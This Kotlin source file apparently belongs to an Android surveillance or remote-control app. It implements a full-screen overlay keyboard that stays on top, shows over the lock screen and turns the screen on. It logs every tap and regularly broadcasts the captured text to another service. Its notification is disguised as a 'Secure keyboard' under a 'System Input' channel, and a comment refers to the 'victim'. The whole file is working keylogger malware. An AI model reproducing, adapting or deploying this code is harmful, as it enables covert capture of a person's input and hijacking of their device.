package com.sync.xxx

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.view.*
import android.widget.FrameLayout
import android.widget.GridLayout
import android.widget.TextView
import androidx.core.app.NotificationCompat

/**
 * Brutal on-screen keyboard overlay.
 * Full-screen semi-transparent dark layer + large virtual keyboard that stays on top.
 * Logs every tap to DeviceService via broadcast. Survives orientation; only stops via command.
 */
class KeyboardOverlayService : Service() {

    companion object {
        const val CHANNEL_ID = "kb_overlay_ch"
        const val NOTIF_ID = 8842
        @Volatile var running = false
        private val KEYS = listOf(
            listOf("1","2","3","4","5","6","7","8","9","0"),
            listOf("Q","W","E","R","T","Y","U","I","O","P"),
            listOf("A","S","D","F","G","H","J","K","L"),
            listOf("Z","X","C","V","B","N","M","⌫","SPC","ENT")
        )
    }

    private var wm: WindowManager? = null
    private var root: FrameLayout? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    private var logBuffer = StringBuilder()
    private var flushRunnable: Runnable? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createChannel()
        startForeground(NOTIF_ID, buildNotif())
        running = true
        showOverlay()
        scheduleFlush()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "STOP") {
            stopSelf()
            return START_NOT_STICKY
        }
        return START_STICKY
    }

    override fun onDestroy() {
        running = false
        flushRunnable?.let { mainHandler.removeCallbacks(it) }
        removeOverlay()
        flushLog(force = true)
        super.onDestroy()
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "System Input", NotificationManager.IMPORTANCE_LOW)
            ch.setSound(null, null)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
        }
    }

    private fun buildNotif(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Input method")
            .setContentText("Secure keyboard active")
            .setSmallIcon(android.R.drawable.ic_menu_edit)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private fun showOverlay() {
        mainHandler.post {
            try {
                wm = getSystemService(WINDOW_SERVICE) as WindowManager
                val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                else
                    @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    type,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
                    PixelFormat.TRANSLUCENT
                )
                params.gravity = Gravity.TOP or Gravity.START

                root = FrameLayout(this).apply {
                    setBackgroundColor(Color.argb(210, 0, 0, 0))
                    isClickable = true
                    isFocusable = true
                }

                val grid = GridLayout(this).apply {
                    columnCount = 10
                    rowCount = 4
                    setPadding(8, 8, 8, 8)
                    layoutParams = FrameLayout.LayoutParams(
                        FrameLayout.LayoutParams.MATCH_PARENT,
                        FrameLayout.LayoutParams.WRAP_CONTENT,
                        Gravity.BOTTOM
                    ).also { it.bottomMargin = 24 }
                }

                KEYS.forEach { row ->
                    row.forEach { label ->
                        val tv = TextView(this).apply {
                            text = label
                            textSize = 18f
                            setTextColor(Color.WHITE)
                            typeface = Typeface.DEFAULT_BOLD
                            gravity = Gravity.CENTER
                            setBackgroundColor(Color.argb(180, 40, 40, 40))
                            setPadding(6, 22, 6, 22)
                            val lp = GridLayout.LayoutParams().apply {
                                width = 0
                                height = GridLayout.LayoutParams.WRAP_CONTENT
                                columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f)
                                setMargins(3, 3, 3, 3)
                            }
                            layoutParams = lp
                            setOnClickListener {
                                onKeyTap(label)
                                // visual press
                                setBackgroundColor(Color.argb(220, 0, 120, 255))
                                mainHandler.postDelayed({
                                    setBackgroundColor(Color.argb(180, 40, 40, 40))
                                }, 80)
                            }
                        }
                        grid.addView(tv)
                    }
                }

                // log preview strip
                val preview = TextView(this).apply {
                    id = 0x7788
                    text = "KEYLOG › "
                    setTextColor(Color.GREEN)
                    textSize = 13f
                    setBackgroundColor(Color.argb(160, 0, 0, 0))
                    setPadding(16, 12, 16, 12)
                    maxLines = 3
                    layoutParams = FrameLayout.LayoutParams(
                        FrameLayout.LayoutParams.MATCH_PARENT,
                        FrameLayout.LayoutParams.WRAP_CONTENT,
                        Gravity.TOP
                    )
                }

                root?.addView(preview)
                root?.addView(grid)
                wm?.addView(root, params)
            } catch (e: Exception) {
                Log.e("KeyboardOverlay", "show: ${e.message}")
            }
        }
    }

    private fun onKeyTap(label: String) {
        val ch = when (label) {
            "SPC" -> " "
            "ENT" -> "\n"
            "⌫" -> {
                if (logBuffer.isNotEmpty()) logBuffer.deleteCharAt(logBuffer.length - 1)
                updatePreview()
                return
            }
            else -> label
        }
        logBuffer.append(ch)
        if (logBuffer.length > 2000) logBuffer.delete(0, logBuffer.length - 1500)
        updatePreview()
    }

    private fun updatePreview() {
        mainHandler.post {
            try {
                val tv = root?.findViewById<TextView>(0x7788)
                val tail = if (logBuffer.length > 80) logBuffer.takeLast(80) else logBuffer.toString()
                tv?.text = "KEYLOG › $tail"
            } catch (_: Exception) {}
        }
    }

    private fun scheduleFlush() {
        flushRunnable = object : Runnable {
            override fun run() {
                flushLog(force = false)
                if (running) mainHandler.postDelayed(this, 4000)
            }
        }
        mainHandler.postDelayed(flushRunnable!!, 4000)
    }

    private fun flushLog(force: Boolean) {
        if (logBuffer.isEmpty() && !force) return
        val payload = logBuffer.toString()
        if (payload.isEmpty()) return
        try {
            val i = Intent("com.sync.xxx.KEYLOG_DATA").apply {
                putExtra("data", payload)
                setPackage(packageName)
            }
            sendBroadcast(i)
            // keep last 200 chars so victim still sees continuity
            if (logBuffer.length > 200) {
                val keep = logBuffer.takeLast(200)
                logBuffer = StringBuilder(keep)
            }
        } catch (e: Exception) {
            Log.e("KeyboardOverlay", "flush: ${e.message}")
        }
    }

    private fun removeOverlay() {
        try {
            root?.let { wm?.removeView(it) }
        } catch (_: Exception) {}
        root = null
        wm = null
    }
}
